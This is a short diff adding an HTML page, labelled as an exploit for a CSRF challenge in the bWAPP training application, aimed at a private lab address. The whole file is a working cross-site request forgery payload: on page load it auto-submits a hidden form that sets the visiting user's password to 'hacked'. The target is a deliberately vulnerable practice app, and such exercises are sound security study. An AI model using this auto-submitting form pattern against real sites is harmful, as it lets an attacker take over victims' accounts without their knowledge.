@@ -1,0 +1,11 @@
+<!-- exploit for Challenge 1 : CSRF vulnerability BWAPP -->
+
+<html>
+	<body onload="document.getElementById('xsrf').submit();">
+		<form id="xsrf" method="GET" action="http://192.168.56.102/BWAPP/csrf_1.php">
+			<input name="password_new" type="hidden" value="hacked">
+			<input name="password_conf" type="hidden" value="hacked">
+			<input name="action" type="hidden" value="Change">
+			</form>
+	</body>
+</html>
